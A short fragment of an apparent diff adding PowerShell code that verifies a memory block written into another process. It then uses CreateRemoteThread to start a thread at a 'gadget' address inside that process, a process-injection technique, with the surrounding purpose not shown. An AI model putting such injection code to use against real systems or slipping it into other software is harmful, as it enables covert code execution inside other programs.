+  if ($null -eq $back -or (HexOf $back 0x100) -ne (HexOf $blk 0x100)) { $res.why = 'block read-back mismatch'; return $res }
+  $tid = [uint32]0
+  $th = [H45]::CreateRemoteThread($script:hProc, [IntPtr]::Zero, [IntPtr]::Zero, [IntPtr]([int64]($script:base + $gadgetRva)), [IntPtr]([int64]$script:ptrSlot), 0, [ref]$tid)
